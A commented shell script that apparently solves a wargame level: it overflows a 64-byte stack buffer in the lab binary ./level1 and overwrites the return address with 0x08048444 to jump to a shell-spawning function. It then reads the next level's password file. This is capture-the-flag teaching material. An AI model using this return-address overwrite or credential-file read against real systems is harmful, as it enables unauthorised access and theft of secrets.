# Helper function, "put n s" print the string 's' n times
put() { printf "$2%.0s" $(seq 1 "$1"); }

# Helper function, "hex 41424344" gives "ABCD"
hex() { echo "$1" | xxd -p -r; }

# Helper function, "hex_little_endian 41424344" gives "DBCA"
hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }

# main function gets 64 characters into a stack buffer and returns
# There is a run function launching a reverse shell
# We put the adress of the run function on the stack
# The ret instruction of the main function will pop it into %eip
# We effectively replaced the ret instruction with a jmp to run

# We fill the buffer
export BUFFER_FILL=$(put 64 "A")

# We fill the alignment of (16 - sizeof(%ebp) - sizeof(%eip))
export CALLING_ALIGNMENT=$(put 8 "A")

# We fill the %ebp saved value with a dummy value
export EBP_REPLACEMENT="AAAA"

# We fill the return address with a the address of the run function
export RUN_ADDRESS="08048444"
export EIP_REPLACEMENT=$(hex_little_endian ${RUN_ADDRESS})

# We print our exploit to the output and wait for the reverse shell to open with cat
(printf "${BUFFER_FILL}${CALLING_ALIGNMENT}${EBP_REPLACEMENT}${EIP_REPLACEMENT}\n" && cat) | ./level1

# We use the reverse shell to retrieve the password
$ cat /home/user/level2/.pass
